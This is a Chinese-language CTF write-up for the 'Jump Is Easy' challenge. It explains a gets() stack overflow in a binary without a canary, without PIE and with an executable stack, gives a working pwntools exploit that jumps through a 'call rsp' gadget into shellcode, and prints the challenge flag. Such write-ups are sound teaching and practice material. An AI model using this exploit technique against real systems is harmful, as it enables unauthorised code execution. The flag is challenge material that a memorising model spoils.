# Jump Is Easy

## 题目简述

题目是 64 位 ELF，输入函数 `gets()` 向栈缓冲区写入任意长度数据。程序无栈 Canary、无 PIE，且栈可执行，因此可以直接覆盖返回地址跳到栈上 shellcode。

## 解题过程

先检查保护：

```bash
checksec --file=jump_is_easy
```

反汇编或用 cyclic pattern 确认从缓冲区起点到保存的 RIP 共 `72` 字节。二进制的可执行映射中在 `0x4020a3` 存在 `call rsp` 指令；返回地址之后的内容正位于当前 `rsp`，因此可用固定 gadget 跳到紧随其后的 shellcode，不需要预测随机化的栈地址。

利用脚本：

```python
from pwn import *

elf = context.binary = ELF("./JIE")
io = process(elf.path)

payload = b"A" * 72
payload += p64(0x4020A3)  # call rsp
payload += asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
```

取得 shell 后读取 flag：

```text
UMDCTF-{Sh311c0d3_1s_The_B35T_p14c3_70_jump_70}
```

## 方法总结

本题展示最直接的栈溢出执行路径：`gets` 提供无界写，72 字节到达 RIP，NX 关闭允许执行栈上注入代码，无 PIE 又让 `call rsp` gadget 地址固定。固定跳板比猜测栈地址可靠；实际利用前仍应确认 gadget 所在段可执行以及输入中不存在坏字符。
